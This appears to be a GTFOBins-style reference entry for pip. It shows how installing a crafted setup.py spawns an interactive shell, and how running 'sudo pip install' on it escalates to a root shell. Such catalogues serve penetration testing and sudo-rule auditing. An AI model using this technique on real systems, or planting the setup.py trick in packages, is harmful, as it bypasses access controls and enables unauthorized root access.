---
description: |
  More generally, this allows to execute arbitrary Python code. See the [Python](/gtfobins/python/) functions.
functions:
  execute-interactive:
    - code: |
        TF=$(mktemp -d)
        echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
        pip install $TF
  sudo-enabled:
    - code: |
        TF=$(mktemp -d)
        echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
        sudo pip install $TF
---
